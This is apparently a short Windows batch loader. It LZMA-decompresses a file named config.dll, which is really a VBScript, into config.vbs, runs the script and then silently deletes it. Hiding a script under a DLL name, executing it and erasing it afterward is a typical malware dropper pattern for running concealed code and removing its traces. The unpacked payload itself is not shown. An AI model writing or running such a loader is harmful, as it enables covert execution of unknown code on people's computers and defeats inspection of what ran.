cd %~dp0
%extd% /unlzma "C:\IITBS\DAPL\config.dll" "C:\IITBS\DAPL\config.vbs"
call "C:\IITBS\DAPL\config.vbs"
del /q "C:\IITBS\DAPL\config.vbs"
exit